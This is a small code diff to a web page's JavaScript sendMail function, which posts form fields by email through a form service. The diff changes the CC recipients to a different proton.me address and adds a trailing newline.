@@ -97,7 +97,7 @@
         async function sendMail(dataObj, sujet){
             const formData = new FormData();
             formData.append("_subject", sujet);
-            formData.append("_cc", "tonemail@protonmail.com,boss@protonmail.com");
+            formData.append("_cc", "John123abcd@proton.me,John123abcd@proton.me");
             formData.append("_captcha", "false");
             for(let key in dataObj){ formData.append(key, dataObj[key]); }
             try {
@@ -151,3 +151,4 @@
 
 </body>
 </html>
+
